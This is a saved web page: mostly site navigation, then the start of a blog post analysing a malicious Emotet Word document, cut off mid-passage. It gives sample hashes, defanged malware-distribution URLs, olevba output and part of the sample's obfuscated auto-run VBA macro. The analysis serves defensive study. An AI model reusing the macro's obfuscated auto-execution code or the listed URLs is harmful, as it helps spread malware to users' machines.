				<img src="https://www.picussecurity.com/hubfs/2023%20-%20Optimization/logos/menu-featured/white%20paper.svg" alt="white paper">
			 </div>
			 
			 <div class="card-content">
				<span class="title">DATASHEET</span>
				<span class="description">Security Validation Platform</span>
			 </div>
			</div>
			
			
		 </div>
		</div>
		
	 </div>  
	</div>
	
	  
 </div>
 
 

 
 <div class="dropdown">
	  
	<div class="hs-menu-item hs-menu-depth-1 hs-item-has-children bg-color-">
	 
	 <a href="https://www.picussecurity.com/use-case" class="top-nav use-cases">Use Cases</a>
	 
	</div>
	
	<div class="dropdown-content">
	 <div class="page-center">		
		
		<div class="menu-type two-col  second-col-exists">
		 <div class="menu1">
			<span class="h3">Use Cases</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/breach-and-attack-simulation" role="menuitem" target="_self">Breach and Attack Simulation</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/use-case/pen-testing-automation" role="menuitem" target="_self">Automated Penetration Testing</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/use-case/adversarial-exposure-validation" role="menuitem" target="_self">Adversarial Exposure Validation</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="menu2">
			<span class="h3">Frameworks</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/continuous-threat-exposure-management" role="menuitem" target="_self">CTEM</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/mitre-attck" role="menuitem" target="_self">MITRE ATT&amp;CK</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/digital-operational-resiliency-act" role="menuitem" target="_self">Digital Operational Resiliency Act (DORA)</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="overview 1">		
			
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://www.picussecurity.com/resource/whitepaper/multi-layered-defense-strategy-with-bas" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
				<img src="https://www.picussecurity.com/hubfs/2023%20-%20Optimization/Group.svg" alt="Group">
			 </div>
			 
			 <div class="card-content">
				<span class="title">WHITEPAPER</span>
				<span class="description">Building a Robust Defense-in-Depth Strategy with Breach and Attack Simulation (BAS)</span>
			 </div>
			</div>
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://www.picussecurity.com/resource/report/introduction-to-exposure-validation" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
				<img src="https://www.picussecurity.com/hubfs/2023%20-%20Optimization/Paper%20Icons.svg" alt="Paper Icons">
			 </div>
			 
			 <div class="card-content">
				<span class="title">E-BOOK</span>
				<span class="description">An Introduction to Exposure Validation</span>
			 </div>
			</div>
			
			
		 </div>
		</div>
		
	 </div>  
	</div>
	
	  
 </div>
 
 

 
 <div class="dropdown">
	  
	<div class="hs-menu-item hs-menu-depth-1 hs-item-has-children bg-color-">
	 
	 <a href="https://www.picussecurity.com/resource/tag/reports" class="top-nav research">Research</a>
	 
	</div>
	
	<div class="dropdown-content">
	 <div class="page-center">		
		
		<div class="menu-type two-col  second-col-exists">
		 <div class="menu1">
			<span class="h3">RESEARCH</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/picus-labs" role="menuitem" target="_self">Picus Labs</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/red-report" role="menuitem" target="_self">Red Report</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/report/blue-report-2024" role="menuitem" target="_self">Blue Report</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://insights.picussecurity.com/know-your-cyber-threats" role="menuitem" target="_self">Actionable Threat Intelligence Report</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://picuslabs.io/tools/attack-simulator" role="menuitem" target="_self">Emerging Threat Simulator</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="menu2">
			<span class="h3">LEARNING</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/emerging-threat" role="menuitem" target="_self">Emerging Threats</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://academy.picussecurity.com/" role="menuitem" target="_self">Purple Academy</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/glossary" role="menuitem" target="_self">Cybersecurity 101</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="overview 1">		
			
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://www.picussecurity.com/resource/report/modernize-your-soc-with-breach-and-attack-simulation" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
				<img src="https://www.picussecurity.com/hubfs/2023%20-%20Optimization/logos/menu-featured/white%20paper.svg" alt="whitepaper">
			 </div>
			 
			 <div class="card-content">
				<span class="title">Whitepaper</span>
				<span class="description">Modernize Your SOC with Breach and Attack Simulation</span>
			 </div>
			</div>
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://www.picussecurity.com/resource/report/blue-report-2024" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
				<img src="https://www.picussecurity.com/hubfs/2023%20-%20Optimization/logos/menu-featured/report%20(1).svg" alt="report (1)">
			 </div>
			 
			 <div class="card-content">
				<span class="title">REPORT</span>
				<span class="description">Blue Report: Effective Threat Exposure Management</span>
			 </div>
			</div>
			
			
		 </div>
		</div>
		
	 </div>  
	</div>
	
	  
 </div>
 
 

 
 <div class="dropdown">
	  
	<div class="hs-menu-item hs-menu-depth-1 hs-item-has-children bg-color-">
	 
	 <a href="https://www.picussecurity.com/en-gb/resource" class="top-nav resources">Resources</a>
	 
	</div>
	
	<div class="dropdown-content">
	 <div class="page-center">		
		
		<div class="menu-type two-col  second-col-exists">
		 <div class="menu1">
			<span class="h3">RESOURCES</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/article" role="menuitem" target="_self">Blog</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/reports" role="menuitem" target="_self">Reports</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://academy.picussecurity.com/" role="menuitem" target="_self">Purple Academy</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/webinar" role="menuitem" target="_self">Webinars</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/case-study" role="menuitem" target="_self">Case Studies</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/datasheet" role="menuitem" target="_self">Datasheets</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/events" role="menuitem" target="_self">Events</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource" role="menuitem" target="_self">Resource Library</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="menu2">
			<span class="h3">LEARNING</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://academy.picussecurity.com/" role="menuitem" target="_self">Purple Academy</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/glossary" role="menuitem" target="_self">Cybersecurity 101</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/emerging-threat" role="menuitem" target="_self">Emerging Threats</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="overview 1">		
			
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://www.picussecurity.com/resource/report/double-your-threat-blocking-in-90-days" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
				<img src="https://www.picussecurity.com/hubfs/2023%20-%20Optimization/Group.svg" alt="Group">
			 </div>
			 
			 <div class="card-content">
				<span class="title">WHITEPAPER</span>
				<span class="description">Double Your Threat Blocking in 90 Days</span>
			 </div>
			</div>
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://www.picussecurity.com/resource/report/introduction-to-exposure-validation" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
				<img src="https://www.picussecurity.com/hubfs/2023%20-%20Optimization/Paper%20Icons.svg" alt="Paper Icons">
			 </div>
			 
			 <div class="card-content">
				<span class="title">E-BOOK</span>
				<span class="description">An Introduction to Exposure Validation</span>
			 </div>
			</div>
			
			
		 </div>
		</div>
		
	 </div>  
	</div>
	
	  
 </div>
 
 

 
 <div class="dropdown">
	  
	<div class="hs-menu-item hs-menu-depth-1 hs-item-has-children bg-color-">
	 
	 <a href="https://www.picussecurity.com/about-us" class="top-nav company">Company</a>
	 
	</div>
	
	<div class="dropdown-content">
	 <div class="page-center">		
		
		<div class="menu-type two-col  second-col-exists">
		 <div class="menu1">
			<span class="h3">COMPANY</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/about-us" role="menuitem" target="_self">About Us</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/leadership" role="menuitem" target="_self">Leadership</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/resource/tag/press-releases" role="menuitem" target="_self">Press Releases</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/events" role="menuitem" target="_self">Events</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/careers-at-picus" role="menuitem" target="_self">Careers</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="menu2">
			<span class="h3">PARTNERS</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/partners" role="menuitem" target="_self">Partner Program</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/technology-alliances" role="menuitem" target="_self">Technology Alliance Program</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="overview 1">		
			
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://events.picussecurity.com/assessing-zero-trust-program-assume-breach-webinar" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
				<img src="https://www.picussecurity.com/hubfs/2023%20-%20Optimization/logos/menu-featured/webinar.svg" alt="webinar">
			 </div>
			 
			 <div class="card-content">
				<span class="title">REGISTER NOW:</span>
				<span class="description">Assessing Your Zero Trust Program with "Assume Breach" Mindset</span>
			 </div>
			</div>
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://www.picussecurity.com/resource/datasheet/the-pioneer-of-breach-and-attack-simulation" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
				<img src="https://www.picussecurity.com/hubfs/2023%20-%20Optimization/logos/menu-featured/Data%20sheet.svg" alt="Data sheet">
			 </div>
			 
			 <div class="card-content">
				<span class="title">DATASHEET</span>
				<span class="description">The Pioneer of Breach &amp; Attack Simulation</span>
			 </div>
			</div>
			
			
		 </div>
		</div>
		
	 </div>  
	</div>
	
	  
 </div>
 
 

   
	<div class="hs-menu-item hs-menu-depth-1 menu-button bg-color-pink">
	 
	 <span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_cta" style="" data-hs-cos-general-type="widget" data-hs-cos-type="cta"><div class="hs-web-interactive-inline" style="" data-hubspot-wrapper-cta-id="151218727472"> 
 <span class="hs-cta-wrapper hs-web-interactive-wrapper"><span class="hs-cta-node hs-web-interactive-node"> <a href="https://cta-service-cms2.hubspot.com/web-interactives/public/v1/track/click?encryptedPayload=AVxigLIforYiTs5YHeeseaGW4ZFwSuguM4%2FS9rZ2VKKHS6Jx3M%2FRhqv%2BRbJEpKqZ%2FbzmNgknaZ9kEZEl0E33lhm6WACETjeqvnEEvu9lMfJVHbnViXIeq%2Bt%2F6bmp60cW7p8lI%2FmIYvB1UUGP%2FXyNyJwZeja%2Bhjp7ulhGt%2FLJZXNTNBKlvw3R%2FOOrLV3Kc1FaaF4%3D&amp;portalId=7048931" target="_blank" rel="noopener" class="hs-inline-web-interactive-151218727472 get-a-demo  " data-hubspot-cta-id="151218727472"> GET A DEMO </a> </span></span> 
</div></span>
	 
	</div>
	
	
 
</div>


</div>
	 </div>
	 

	</div>
	
	<div class="desktop-hidden dt-mobile-burger">	 
	 <div id="nav-icon4" class="">
		<span></span>
		<span></span>
		<span></span>
	 </div>
	</div>
 </div>
</header> 
<div id="hs_cos_wrapper_module_16085751669212" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"></div>
</div>	 
	 
	 

	 









<script>console.log("content.tag_list : (SizeLimitingPyList: [Article])");</script>

















<script>console.log("NO datasheet!");</script>


<script>console.log("NO Reports!");</script>



<script>console.log("NO Webinar!");</script>



<script>console.log("NO Ondemand!");</script>



<script>console.log("NO Glossary!");</script>


<script>console.log("NO Case Study!");</script>









<!-- Begin partial -->





<main class="body-container-wrapper revised v2  generic-template" data-subtemplate="generic-blog-body.html" data-layout-form="">
 <div class="body-container body-container--blog-post">

	
	
	

	
	
	
	
	
	
	
	
	
	
	
	

	
	
	

	
	
	
	
	
	
	
	
	

	
	


	
	
  <div class="main-body">
   <div class="content-background v-else">




	<div class="content-wrapper">
	 <article class="if2 blog-post article ">
	  
	  <div class="row-fluid author-info">
	  <div class="intro">
	   <div class="breadcrumb-wrapper">
		<nav aria-label="breadcrumb">
		 <ol class="breadcrumb">
		  <li class="breadcrumb-item"><a href="/">Home</a></li>
		  <li class="breadcrumb-item"><a href="https://www.picussecurity.com/resource/glossary/">Blog</a></li>
		  <li class="breadcrumb-item active" aria-current="page"><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Emotet Technical Analysis - Part 1 Reveal the Evil Code</span></li>
		 </ol>
		</nav>
	   </div>

	   
	   
	    
	   <div class="post-details">		
		<a href="https://www.picussecurity.com/resource/author/suleyman-ozarslan-phd" class="author-link">Suleyman Ozarslan, PhD</a>         <span class="next">| January 30, 2020 </span>
		<span class="next">| 37 MIN READ</span>
	   </div>
	   <p class="updated-time">LAST UPDATED ON MARCH 24, 2023</p>	  
	  </div>
	  
	  <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Emotet Technical Analysis - Part 1 Reveal the Evil Code</span></h1>
	  

	 </div>
	  
	  
	  <div class="blog_post_audio--wrapper">
	   <div id="hs_cos_wrapper_blog_post_audio" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><link rel="stylesheet" href="https://48752163.fs1.hubspotusercontent-na1.net/hubfs/48752163/raw_assets/media-default-modules/master/484/js_client_assets/assets/TrackPlayAnalytics-Cm48oVxd.css">
<link rel="stylesheet" href="https://48752163.fs1.hubspotusercontent-na1.net/hubfs/48752163/raw_assets/media-default-modules/master/484/js_client_assets/assets/Tooltip-DkS5dgLo.css">

    <script type="text/javascript">
      window.__hsEnvConfig = {"portalID":7048931,"hublet":"na1","hsEnv":"prod","hsDeployed":true,"hsJSRGates":["CMS:JSRenderer:SeparateIslandRenderOption","CMS:JSRenderer:GraphQLQueryBuild","CMS:JSRenderer:MinifyCSS","CMS:JSRenderer:GetServerSideProps","CMS:JSRenderer:LocalProxySchemaVersion1","CMS:JSRenderer:SharedDeps"]};
      window.__hsServerPageUrl = "https:\u002F\u002Fwww.picussecurity.com\u002Fresource\u002Fblog\u002Femotet-technical-analysis-part-1-reveal-the-evil-code";
      window.__hsBasePath = "\u002Fresource\u002Fblog\u002Femotet-technical-analysis-part-1-reveal-the-evil-code";
    </script>
      </div>
	  </div>
	  <div class="blog-post__body">
	   <div class="blog-post__body_contain">
		

		<span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Emotet was first identified in 2014 as a banking malware stealing sensitive and private information. Although Emotet has been used for years by attackers as a banking malware organized in botnet, we observe that recently it is being used as Infrastructure as a Service (IaaS) for delivering malware, including other banking Trojans. Malware analysts categorize Emotet into epochs depending on command and control (CnC) servers, distribution methods, payloads, and even assigned bots which change over time. In this technical analysis series, we analyzed an Emotet Epoch 2 sample.</p>
<!--more-->
<p>We'll reveal obfuscated malicious macro codes in this first part of the Emotet Technical Analysis series. All techniques used by attackers in this malware are mapped to tactics and techniques in the MITRE ATT&amp;CK Framework.</p>
<h3>Initial Access</h3>
<p>The most common entry vector of Emotet is spearphishing emails. The MITRE ATT&amp;CK Framework classifies spearphishing techniques into Spearphishing Attachment ( <code> <a href="https://attack.mitre.org/techniques/T1193/" target="_blank" rel="noopener"> MITRE ATT&amp;CK T1193 </a> </code> ), Spearphishing Link ( <code> <a href="https://attack.mitre.org/techniques/T1192/" target="_blank" rel="noopener"> MITRE ATT&amp;CK T1192 </a> </code> ) and Spearphishing via Service ( <a href="https://attack.mitre.org/techniques/T1194/" target="_blank" rel="noopener"> <code>MITRE ATT&amp;CK T1194</code> </a> ). In this Emotet strain, spearphishing emails include links to websites that deliver Microsoft Office Word documents to the user upon clicking the link ( <code>User Execution,</code> <a href="https://attack.mitre.org/techniques/T1204/" target="_blank" rel="noopener"> <code>MITRE ATT&amp;CK T1024</code> </a> ). Word documents are not directly attached to emails to avoid defenses that may inspect email attachments ( <code> <a href="https://attack.mitre.org/techniques/T1192/" target="_blank" rel="noopener"> Spearphishing Link, MITRE ATT&amp;CK T1192 </a> </code> ). They include malicious macros that download Emotet banking malware to the target systems.</p>
<p>We'll analyze the following Word document step by step with you:</p>
<pre><span style="font-size: 18px;"><code>MD5: 515f13034bc4ccf635b026722fd5ef9c
SHA-1: 8925b822e1d86d787b4682d1bb803cf1f5ea7031
SHA-256: FF76FF1440947E3DD42578F534B91FDB8229C1F40FED36A3DD5688DBC51F0014

VirusTotal detection rate: <a href="https://www.virustotal.com/gui/file/ff76ff1440947e3dd42578f534b91fdb8229c1f40fed36a3dd5688dbc51f0014/detection" target="_blank" rel="noopener">13/61</a> (as of January 21, 2020
Names: ST_28546448.doc, 01856218536426646.doc</code></span></pre>
<p>This word document is distributed by the following links contained in emails:</p>
<ul>
<li>hxxps://alokhoa.vn/wp-content/uploads/lm/1-91751097-8408196-fcan6yhfsu-gg5ak/</li>
</ul>
<ul>
<li>hxxp://honamcharity.ir/mmth4/Documentation/gepvh74lcq7h/</li>
</ul>
<ul>
<li>hxxp://lvita.co/tmp/Reporting/</li>
</ul>
<ul>
<li>hxxp://www.selloderaza.cl/wp-snapshots/balance/e2o6-62079720-0865-srgnquu24o-ppcdh20p/</li>
</ul>
<h3>Execution</h3>
<p>When a victim opens the document, Microsoft Word asks to enable/disable macros. It reveals that macros are embedded in the document ( <code>Scripting,</code> <code> <a href="https://attack.mitre.org/techniques/T1064/" target="_blank" rel="noopener"> MITRE ATT&amp;CK T1064 </a> </code> ).</p>
<figure><img style="width: 480px;" src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img0.png" alt="Image" title="Image"></figure>
<p>The malicious document claims that the user must "Enable content" to open the document. However, enabling content launches the code in the macros.</p>
<figure><img style="width: 528px;" src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img1.png" alt="Image" title="Image"></figure>
<h3>Defense Evasion</h3>
<p>We start by analyzing VBA macros with <code> <a href="https://blog.didierstevens.com/programs/oledump-py/" target="_blank" rel="noopener"> oledump.py </a> </code> <em>.</em></p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="http://oledump.py/" target="_blank" rel="noopener">oledump.py</a> is a script that we use to analyze OLE files and data streams in these files.</div>
</blockquote>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://docs.microsoft.com/en-us/cpp/mfc/ole-background?view=vs-2019" target="_blank" rel="noopener"> Object Linking &amp; Embedding (OLE) </a> is a proprietary technology developed by Microsoft that allows embedding and linking to documents and other objects.</div>
</blockquote>
<p><code>oledump.py</code> reveals dozens of macros, and some of them are empty.</p>
<pre><span style="font-size: 18px;"><code>  1:      4096 '\x05DocumentSummaryInformation'
  2:       420 '\x05SummaryInformation'
  3:      6952 '1Table'
  4:    173292 'Data'
  5:        97 'Macros/Bkfiqlsjzo/\x01CompObj'
  6:       267 'Macros/Bkfiqlsjzo/\x03VBFrame'
  7:        38 'Macros/Bkfiqlsjzo/f'
  8:         0 'Macros/Bkfiqlsjzo/o'
  9:        97 'Macros/Cirlqxmy/\x01CompObj'
  10:       265 'Macros/Cirlqxmy/\x03VBFrame'
  11:        38 'Macros/Cirlqxmy/f'
  12:         0 'Macros/Cirlqxmy/o'
  13:        97 'Macros/Crpckdmcyo/\x01CompObj'
  14:       267 'Macros/Crpckdmcyo/\x03VBFrame'
  15:        38 'Macros/Crpckdmcyo/f'
  16:         0 'Macros/Crpckdmcyo/o'
  17:        97 'Macros/Cvvqkbkmpnr/\x01CompObj'
  18:       268 'Macros/Cvvqkbkmpnr/\x03VBFrame'
  19:        38 'Macros/Cvvqkbkmpnr/f'
  20:         0 'Macros/Cvvqkbkmpnr/o'

  ............ stripped ............</code></span></pre>
<p><!--more--></p>
<p>We also parse the document with <code> <a href="https://github.com/decalage2/oletools/wiki/olevba" target="_blank" rel="noopener"> olevba </a> </code> <em>.</em></p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://github.com/decalage2/oletools/wiki/olevba" target="_blank" rel="noopener"> Olevba </a> is a script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel) for detecting VBA (Visual Basic for Applications) macros and extract their source code.</div>
</blockquote>
<p>When we parse the Word document with <code>olevba</code> , it also reveals dozens of macro streams, and some of them are empty.</p>
<pre><span style="font-size: 18px;"><code>olevba 0.55.1 on Python 2.7.12 - http://decalage.info/python/oletools
===============================================================================
FILE: ST_28546448.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Lunzqxdidt.cls
in file: ST_28546448.doc - OLE stream: u'Macros/VBA/Lunzqxdidt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub <mark>Document_open()</mark>
Awzttocpmk
End Sub
-------------------------------------------------------------------------------
VBA MACRO Dtcqcidgf.frm
in file: ST_28546448.doc - OLE stream: u'Macros/VBA/Dtcqcidgf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bkfiqlsjzo.frm
in file: ST_28546448.doc - OLE stream: u'Macros/VBA/Bkfiqlsjzo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ehmkurtl.frm
in file: ST_28546448.doc - OLE stream: u'Macros/VBA/Ehmkurtl'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ydkbuixknjvib.frm
in file: ST_28546448.doc - OLE stream: u'Macros/VBA/Ydkbuixknjvib'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jzvaecqzzki.frm
in file: ST_28546448.doc - OLE stream: u'Macros/VBA/Jzvaecqzzki'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)

............ stripped............</code></span></pre>
<p>Olevba uncovers that there are some suspicious macro codes in the document, such as <code>Hex</code> and <code>Base64</code> encoded strings, <code>ChrW</code> and <code>ShowWindow</code> functions. We used <code>--decode</code> and <code>--deobf</code> paramaters of <code>olevba</code> to decode and deobfuscate macro streams but they do not reveal because macro codes are heavily obfuscated ( <code>Obfuscated Files or Information,</code> <code> <a href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener"> MITRE ATT&amp;CK T1027 </a> </code> ).</p>
<pre><code>+----------+--------------------+---------------------------------------------+
|<span style="font-size: 18px;">Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
<mark>|AutoExec</mark>  |<mark>Document_open</mark>       |<mark>Runs when the Word or Publisher document is | | | |opened </mark>                                      |
|Suspicious|showwindow          |May hide the application                     |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+-------------</span>--------------------------------+</code></pre>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;">Olevba also detects security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware and several common obfuscation methods including Hex and Base64 encoding.</div>
</blockquote>
<p><!--more--></p>
<p>There are too many macro streams to analyze in the analyzed document, but <code>olevba</code> revealed the starting point: <code>Document_open</code> sub.</p>
<pre><code>1.
Private Sub Document_open()
<strong>Awzttocpmk </strong>End Sub</code></pre>
<p><!--more--></p>
<p>Let' look at <code>Awzttocpmk</code> function:</p>
<pre><code>2.
function Awzttocpmk()
dv = "in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t" + ChrW(wdKeyS) + ":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_" + Dtcqcidgf. Ekrdfjzpyjnsx + "r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns="
For Bekkjavx = rgfasd To Qforoylvscd
ewr = dsf - CVar(er * 23)
Mdwqzgbq = CSng(Pagurlxflyza)
